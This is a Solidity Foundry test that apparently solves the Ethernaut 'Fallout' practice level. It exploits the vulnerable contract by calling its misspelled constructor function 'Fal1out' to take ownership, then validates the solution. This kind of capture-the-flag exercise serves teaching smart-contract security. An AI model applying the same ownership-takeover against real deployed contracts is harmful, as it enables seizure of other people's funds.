// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {FalloutFactory} from "src/levels/FalloutFactory.sol";

interface IFallout {
    function Fal1out() external payable;
}

contract FalloutTest is Test {
    // Ethernaut public ethernaut;
    FalloutFactory level;
    IFallout target;
    address player;

    function setUp() public {
        // ----------------------------------
        // Create level instance
        // ----------------------------------
        level = new FalloutFactory();
        player = makeAddr("PLAYER");
        target = IFallout(level.createInstance(player));
    }

    function test_Fallout() public {
        // ----------------------------------
        // Initiate attack
        // ----------------------------------
        vm.prank(player);

        // There's a typo in constructor function, anyone can call that function
        target.Fal1out();

        // ----------------------------------
        // Validate
        // ----------------------------------
        bool success = level.validateInstance(payable(address(target)), player);
        assertEq(success, true);
    }
}
